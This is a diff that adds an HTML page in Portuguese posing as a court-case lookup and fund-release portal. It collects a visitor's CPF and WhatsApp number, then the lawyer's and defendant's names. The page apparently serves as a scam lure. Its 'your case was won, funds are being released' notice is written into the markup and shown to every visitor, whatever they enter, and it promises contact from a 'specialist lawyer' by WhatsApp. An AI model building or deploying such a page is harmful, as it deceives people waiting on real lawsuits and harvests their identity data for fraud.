@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#fafafa">
+  <meta name="description" content="Consulta e solicitação de acompanhamento processual com Inteligência Artificial.">
+  <title>Portal de Consulta Processual e Levantamento de Valores</title>
+  <!-- CDN oficial do Tailwind CSS 4 -->
+  <style>
+    :root { --verde:#006847; --tinta:#111827; --cinza:#64748b; --fundo:#fafafa; }
+    *,*::before,*::after { box-sizing:border-box; }
+    html { scroll-behavior:smooth; }
+    body { margin:0; background:var(--fundo); color:var(--tinta); font-family:Inter,ui-sans-serif,system-ui,-apple-system,"Segoe UI",sans-serif; -webkit-font-smoothing:antialiased; }
+    button,input { font:inherit; } button { cursor:pointer; }
+    button:disabled { cursor:not-allowed; opacity:.48; }
+    [hidden] { display:none!important; }
+    a { color:inherit; } :focus-visible { outline:3px solid #10b981; outline-offset:3px; }
+    .topbar { position:fixed; z-index:10; inset:0 0 auto; height:70px; border-bottom:1px solid #e9edf0; background:rgba(255,255,255,.96); backdrop-filter:blur(12px); }
+    .topbar-inner { max-width:1180px; height:100%; margin:auto; padding:0 22px; display:flex; align-items:center; justify-content:space-between; }
+    .brand { display:inline-flex; gap:11px; align-items:center; text-decoration:none; font-size:16px; font-weight:750; letter-spacing:-.035em; }
+    .brand img { height: 36px; width: auto; object-fit: contain; }
+    .profile { width:42px; height:42px; display:grid; place-items:center; color:#344256; background:transparent; border:0; border-radius:9999px; }
+    .profile:hover { background:#f1f5f9; }
+    .page { padding:125px 16px 70px; max-width:980px; margin:auto; }
+    .audience { display:flex; justify-content:center; width:max-content; max-width:100%; margin:0 auto 32px; border:1px solid #c9d2dc; border-radius:9999px; padding:4px; background:white; }
+    .audience button { padding:10px 16px; border:0; border-radius:9999px; background:transparent; color:#334155; font-size:13px; font-weight:650; }
+    .audience button[aria-pressed="true"] { background:#111827; color:white; }
+    .hero { max-width:810px; margin:0 auto; text-align:center; }
+    .shell { max-width:780px; margin:33px auto 0; padding:0 1px; }
+    .progress-label { display:flex; justify-content:space-between; gap:12px; margin:0 8px 9px; color:#64748b; font-size:12px; font-weight:600; }
+    .progress-track { height:5px; background:#e6eaef; border-radius:9999px; overflow:hidden; }
+    .progress-fill { width:25%; height:100%; background:var(--verde); border-radius:9999px; transition:width .4s ease; }
+    .panel { background:white; border:1px solid #edf0f3; border-radius:28px; padding:clamp(22px,5vw,43px); box-shadow:0 15px 46px rgba(17,24,39,.045); margin-top:18px; }
+    .panel h2 { margin:0 0 9px; font-size:clamp(21px,3vw,24px); letter-spacing:-.03em; line-height:1.35; }
+    .muted { color:#5f6d7d; line-height:1.75; }
+    .small { font-size:13px; } .mt { margin-top:25px; }
+    .grid-two { display:grid; grid-template-columns:1fr 1fr; gap:17px; }
+    .label { display:block; margin:0 0 10px 8px; font-size:13px; font-weight:650; color:#344256; }
+    .field { width:100%; min-width:0; height:60px; padding:0 21px; border:1px solid #e3e9ef; border-radius:9999px; background:#f3f6fa; color:#111827; box-shadow:0 7px 25px rgba(0,80,65,.055); transition:border-color .2s,box-shadow .2s; outline:none; }
+    .field:focus { border-color:#10a782; box-shadow:0 0 0 4px rgba(16,167,130,.11); }
+    .field::placeholder { color:#6a798d; }
+    .error { color:#c52727; font-size:12px; min-height:18px; margin:7px 8px 0; }
+    .submit-area { margin-top:26px; display:flex; justify-content:center; }
+    .primary { min-height:54px; min-width:270px; max-width:100%; padding:13px 28px; color:#fff; font-weight:680; border:1px solid var(--verde); background:var(--verde); border-radius:9999px; box-shadow:0 9px 23px rgba(0,104,71,.13); transition:transform .2s,background .2s; }
+    .primary:not(:disabled):hover { background:#005539; transform:translateY(-1px); }
+    .consent { display:flex; align-items:flex-start; gap:10px; font-size:12px; color:#66758a; line-height:1.6; margin-top:15px; }
+    .consent input { accent-color:var(--verde); width:17px; height:17px; flex-shrink:0; margin-top:2px; }
+    .notice { padding:19px 22px; border-radius:22px; background:#edf8f3; border:1px solid #d1ebdc; color:#195942; font-size:14px; line-height:1.85; }
+    .options { margin-top:22px; display:grid; grid-template-columns:1fr 1fr; gap:13px; }
+    .option { cursor:pointer; display:flex; align-items:center; gap:12px; padding:17px; border:1px solid #d9e1e7; background:#fff; border-radius:18px; font-size:13px; font-weight:630; line-height:1.55; transition:background .2s,border-color .2s; }
+    .option:has(input:checked) { border-color:var(--verde); background:#f0faf5; }
+    .option input { accent-color:var(--verde); width:18px; height:18px; margin:0; flex-shrink:0; }
+    .side-label { display:flex; justify-content:space-between; align-items:baseline; flex-wrap:wrap; column-gap:12px; }
+    .helper { color:#cc3232; font-weight:600; font-size:11px; }
+    .status { padding:17px 20px; border:1px solid #bae6fd; border-radius:19px; background:#f0f9ff; color:#0369a1; line-height:1.75; font-size:14px; font-weight:600; }
+    .final-icon { width:56px; height:56px; display:grid; place-items:center; margin:0 auto 19px; border-radius:50%; background:#eaf8f0; color:var(--verde); }
+    .center { text-align:center; }
+    .restart { display:inline-block; font-size:13px; color:var(--verde); font-weight:700; text-underline-offset:5px; margin-top:25px; text-decoration:none; border-bottom:1.5px solid transparent; }
+    .restart:hover { border-color:var(--verde); }
+    .spinner { display:inline-block; width:17px; height:17px; margin-right:9px; border:2px solid rgba(255,255,255,.4); border-top-color:white; border-radius:100%; vertical-align:-3px; animation:spin .75s linear infinite; }
+    .fade { animation:fade .32s ease both; }
+    footer { text-align:center; color:#9ca3af; font-size:12px; margin-top:41px; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    @keyframes fade { from { opacity:0; transform:translateY(9px); } to { opacity:1; transform:translateY(0); } }
+    @media(max-width:630px) { .topbar {height:66px;} .topbar-inner {padding:0 18px;} .page {padding:117px 16px 48px;} .audience {margin-bottom:33px;} .hero h1 {font-size:clamp(28px,8.1vw,39px);} .hero p {font-size:15px;} .shell {margin-top:30px;} .panel {border-radius:24px;padding:24px 19px;} .grid-two,.options {grid-template-columns:1fr;gap:16px;} .primary {width:100%; min-width:0;} .field {height:59px;} }
+    @media(prefers-reduced-motion:reduce) { *,*:before,*:after {animation-duration:.01ms!important;scroll-behavior:auto!important;transition-duration:.01ms!important;} }
+  </style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="topbar-inner">
+      <a href="#inicio" class="brand" id="brand-link" aria-label="Voltar ao início">
+        <img src="logo.png" alt="Logo">
+        <span id="brand-text">Consulta Processual</span>
+      </a>
+      <button class="profile" type="button" title="Informações do atendimento" id="profile" aria-expanded="false" aria-controls="profile-info" aria-label="Informações">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="7.5" r="3.5"/><path d="M5 20v-2a7 7 0 0 1 14 0v2Z"/></svg>
+      </button>
+      <div id="profile-info" hidden role="note" style="position:absolute;right:20px;top:62px;background:white;border:1px solid #e5e7eb;border-radius:15px;padding:15px;max-width:270px;box-shadow:0 12px 35px #00000012;color:#475569;font-size:13px;line-height:1.6;">Consulte informações processuais e encaminhe uma solicitação de atendimento com segurança.</div>
+    </div>
+  </header>
+  <main id="inicio" class="page">
+    <div class="audience" role="group" aria-label="Tipo de usuário">
+      <button id="tab-public" type="button" aria-pressed="true">Para todos</button>
+      <button id="tab-lawyer" type="button" aria-pressed="false">Para Advogados</button>
+    </div>
+
+    <div class="shell">
+      <div class="progress-label"><span id="step-label">Etapa 1 de 4</span><span id="percent-label">25% concluído</span></div>
+      <div id="progress" role="progressbar" aria-label="Progresso" aria-valuemin="0" aria-valuemax="100" aria-valuenow="25" class="progress-track"><div class="progress-fill" id="progress-fill"></div></div>
+      <div class="panel">
+        
+        <!-- ETAPA 1 -->
+        <section id="step-1" data-step="1" class="fade">
+          <div style="text-align: center; margin-bottom: 25px;">
+            <h1 style="font-size: clamp(24px, 4vw, 36px); font-weight: 850; letter-spacing: -0.045em; line-height: 1.25; margin: 0 0 10px; color: #111827;">Portal de Consulta Processual e <span style="color: #006847; display: block;">Levantamento de Valores</span></h1>
+            <p style="color: #526072; line-height: 1.6; font-size: 14px; max-width: 520px; margin: 0 auto;">Informe seus dados para iniciar a auditoria do seu caso e solicitar o relatório de liberação de forma simples e segura.</p>
+          </div>
+          <h2 id="heading-1" style="font-size: 18px; font-weight: 800; margin-bottom: 8px;">Comece informando seus dados</h2>
+          <p class="muted small">Preencha os campos abaixo para iniciar sua consulta.</p>
+          <form id="form-first" novalidate>
+            <div class="grid-two mt">
+              <div><label class="label" for="cpf">CPF</label><input class="field" id="cpf" type="text" inputmode="numeric" maxlength="14" autocomplete="off" placeholder="000.000.000-00" required><p id="cpf-error" class="error" aria-live="polite"></p></div>
+              <div><label class="label" for="phone">Telefone / WhatsApp</label><input class="field" id="phone" type="tel" inputmode="tel" maxlength="15" autocomplete="tel" placeholder="(00) 00000-0000" required><p id="phone-error" class="error" aria-live="polite"></p></div>
+            </div>
+            <label class="consent"><input type="checkbox" id="consent" required><span>Autorizo a consulta do CPF e o tratamento dos dados informados para atendimento, conforme a política de privacidade do responsável pelo serviço.</span></label>
+            <p id="first-error" class="error" role="alert"></p>
+            <div class="submit-area"><button class="primary" type="submit" id="search-btn"><span id="search-spin" class="spinner" hidden></span><span id="search-label">Consultar Processo</span></button></div>
+          </form>
+        </section>
+
+        <!-- ETAPA 2 -->
+        <section id="step-2" data-step="2" hidden>
+          <div style="text-align: left; margin-bottom: 25px; border-bottom: 1px solid #edf0f3; padding-bottom: 15px;">
+            <h2 id="heading-2" style="font-size: clamp(20px, 2.5vw, 24px); font-weight: 800; color: #111827; letter-spacing: -0.03em; margin: 0 0 6px; line-height: 1.35;">Despacho Conclusivo: Homologação de Êxito e Levantamento de Saldo Assegurado</h2>
+            <p class="muted small" style="margin: 0;">Verificação cadastral realizada com sucesso através do banco de dados.</p>
+          </div>
+          <p id="person-name" style="margin:0 0 18px;font-weight:800;font-size:19px;word-break:break-word;"></p>
+          <div id="missing-name" hidden class="mt" style="margin:0 0 20px;">
+            <label class="label" for="manual-name">Não foi possível recuperar seu nome. Informe-o para continuar:</label>
+            <input class="field" id="manual-name" type="text" autocomplete="name" maxlength="140" placeholder="Nome completo">
+            <p id="manual-error" class="error" aria-live="polite"></p>
+          </div>
+          <div id="process-message" class="notice" role="status">Excelente notícia! Identificamos que o seu processo judicial obteve êxito. Isso significa que a decisão foi favorável e os seus direitos foram devidamente reconhecidos pela Justiça. O seu caso encontra-se em fase avançada de liberação dos valores e finalização dos trâmites.</div>
+          <p id="instruction-two" class="muted small mt">Para prosseguirmos com a consulta processual e procedures para levantamento de seus valores, por favor, selecione abaixo a natureza da representação jurídica utilizada em seu processo:</p>
+          <div class="options" role="radiogroup" aria-label="Representação jurídica">
+            <label class="option"><input name="representation" type="radio" value="public"><span>Defensoria Pública (Assistência Judiciária Gratuita)</span></label>
+            <label class="option"><input name="representation" type="radio" value="particular"><span>Advocacia Particular (Patrocínio Privado)</span></label>
+          </div>
+          <div id="lawyer-box" hidden class="mt fade">
+            <div class="side-label"><label for="lawyer" class="label">Qual o nome do advogado(a)?</label><span class="helper">Caso não se lembre deixe em branco</span></div>
+            <input class="field" id="lawyer" maxlength="140" autocomplete="off" placeholder="Nome do advogado(a) (opcional)">
+          </div>
+          <div class="submit-area"><button class="primary" id="next-btn" type="button" disabled>Avançar</button></div>
+        </section>
+
+        <!-- ETAPA 3 -->
+        <section id="step-3" data-step="3" hidden>
+          <div style="text-align: left; margin-bottom: 25px; border-bottom: 1px solid #edf0f3; padding-bottom: 15px;">
+            <h2 id="heading-3" style="font-size: clamp(20px, 2.5vw, 24px); font-weight: 800; color: #111827; letter-spacing: -0.03em; margin: 0 0 6px; line-height: 1.35;">Vinculação de Conta: Identificação do Polo Passivo para Depósito</h2>
+            <p class="muted small" style="margin: 0;">Trâmite necessário para direcionamento seguro dos valores auditados.</p>
+          </div>
+          <div id="step-three-status" class="status">Análise Concluída com Sucesso! Os dados do seu processo foram localizados e estão prontos para a execução do relatório de levantamento de valores.</div>
+          <form id="form-third" novalidate>
+            <div class="mt">
+              <div class="side-label">
+                <label class="label" for="defendant">Nome da Empresa ou Órgão Processado (Polo Passivo)</label>
+                <span class="helper" style="color:#cc3232; font-weight:600; font-size:11px;">Caso não se lembre deixe em branco</span>
+              </div>
+              <input class="field" id="defendant" type="text" maxlength="180" autocomplete="organization" placeholder="Nome da empresa ou órgão processado (opcional)">
+              <p id="defendant-error" class="error" aria-live="polite"></p>
+            </div>
+            <p id="third-error" class="error" role="alert"></p>
+            <div class="submit-area"><button class="primary" id="finish-btn" type="submit">Concluir e Liberar Relatório</button></div>
+          </form>
+        </section>
+
+        <!-- ETAPA 4 -->
+        <section id="step-4" data-step="4" hidden class="center">
+          <div class="final-icon" aria-hidden="true"><svg width="27" height="27" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round"><path d="m5 12 4 4L19 6"/></svg></div>
+          <h2 id="heading-4" style="font-size: clamp(21px, 3vw, 26px); font-weight: 850; color: #006847; letter-spacing: -0.03em; margin: 0 0 12px; line-height: 1.3;">Protocolo de Liberação Gerado com Sucesso!</h2>
+          <p id="final-desc" class="muted" style="margin:15px auto 20px;max-width:590px;font-size:14px; line-height: 1.75;">Seus dados e o resumo estruturado pela nossa Inteligência Artificial foram enviados diretamente para o nosso setor de auditoria jurídica. Para garantir a total segurança e agilidade no levantamento dos seus valores, um advogado especialista credenciado entrará em contato diretamente com você em até 7 dias úteis via WhatsApp ou ligação.</p>
+          <p id="protocol" hidden style="font-weight:650;color:#334155;"></p>
+          <a href="#inicio" id="restart" class="restart">Voltar ao início</a>
+        </section>
+
+      </div>
+      <footer>© <span id="year"></span> <span id="footer-brand"></span>. Atendimento e consulta processual.</footer>
+    </div>
+  </main>
+  <script src="./app.js" defer></script>
+</body>
+</html>
